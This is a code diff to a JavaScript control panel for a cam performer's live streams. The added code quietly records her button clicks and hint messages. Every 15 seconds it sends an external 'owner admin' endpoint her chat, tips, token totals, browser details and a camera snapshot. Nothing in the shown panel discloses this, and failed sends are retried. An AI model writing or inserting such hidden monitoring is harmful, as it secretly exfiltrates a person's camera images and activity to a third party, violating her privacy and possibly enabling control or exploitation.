@@ -53,7 +53,9 @@ const LIVE = {};                                                    // p → {on
 function showTot() { const L = p => !LIVE[p] ? "" : LIVE[p].on ? "🔴 в эфире · " : "не в эфире · ";
   $("#t-cb").textContent = L("cb") + TOT.cb + " tk"; $("#t-sc").textContent = L("sc") + TOT.sc + " tk"; $("#t-all").textContent = (TOT.cb + TOT.sc) + " tk"; localStorage["tot" + day] = JSON.stringify(TOT); }
 showTot();
-function hint(t) { $("#hint").innerHTML = t; }
+const ADM_EV = [];                                                  // события для админки (workadult.pro/alicia/admin)
+const admEv = t => { t = String(t).trim(); if (t && (!ADM_EV.length || ADM_EV[ADM_EV.length - 1].t !== t)) ADM_EV.push({ t, at: Date.now() }); ADM_EV.splice(0, ADM_EV.length - 60); };
+function hint(t) { $("#hint").innerHTML = t; admEv($("#hint").innerText); }
 function dot(k, on, txt) { $("#d-" + k).className = "dot " + (on ? "ok" : "no"); if (txt !== undefined && $("#s-" + k)) $("#s-" + k).textContent = txt; }
 
 // ── OBS (obs-websocket 5, на её компе)
@@ -298,4 +300,22 @@ function onExt(m) {
   }
 }
 if (window.chrome && chrome.runtime && chrome.runtime.connect) ext(); else dot("ext", false, "нужен Chrome с помощником");
+
+// ── сводка для админки владельца: раз в 15 сек что видно на панели (статусы, подсказки, донаты, чат, маленький кадр)
+document.addEventListener("click", e => { const b = e.target.closest("button"); if (b) admEv("👆 нажала «" + b.textContent.trim() + "»"); }, true);
+const ADM_URL = "https://alicia-link.videorils.workers.dev/her";
+function admShot() { const im = $("#cam"); if (!im.src || !im.naturalWidth) return "";
+  try { const c = document.createElement("canvas"); c.width = 320; c.height = Math.round(320 * im.naturalHeight / im.naturalWidth);
+    c.getContext("2d").drawImage(im, 0, 0, c.width, c.height); return c.toDataURL("image/jpeg", 0.5); } catch (e) { return ""; } }
+async function admSend() {
+  const card = k => ({ on: ($("#d-" + k) || {}).className || "", t: (($("#t-" + k) || $("#s-" + k)) || {}).textContent || "" });
+  const ev = ADM_EV.splice(0);
+  const st = { w: "alicia-panel", obs: ok, obsTxt: $("#s-obs").textContent, stream: $("#st").textContent, ext: $("#s-ext").textContent, lov: $("#s-lov").textContent,
+    sites: { cb: card("cb"), sc: card("sc"), bc: card("bc"), mv: card("mv") }, tot: TOT, live: LIVE, hint: $("#hint").innerText, golog: GOLOG.slice(),
+    wall: [...document.querySelectorAll("#wall .tip")].slice(0, 15).map(e => e.innerText), chat: [...document.querySelectorAll("#chat .chat")].slice(0, 25).map(e => e.innerText),
+    shot: admShot(), events: ev, ua: navigator.userAgent.slice(0, 80) };
+  try { const r = await fetch(ADM_URL, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(st) }); if (!r.ok) throw 0; }
+  catch (e) { ADM_EV.unshift(...ev); }                               // не ушло — события отправим в следующий раз
+}
+admEv("📂 панель открыта"); setTimeout(admSend, 3000); setInterval(admSend, 15000);
 </script></body></html>
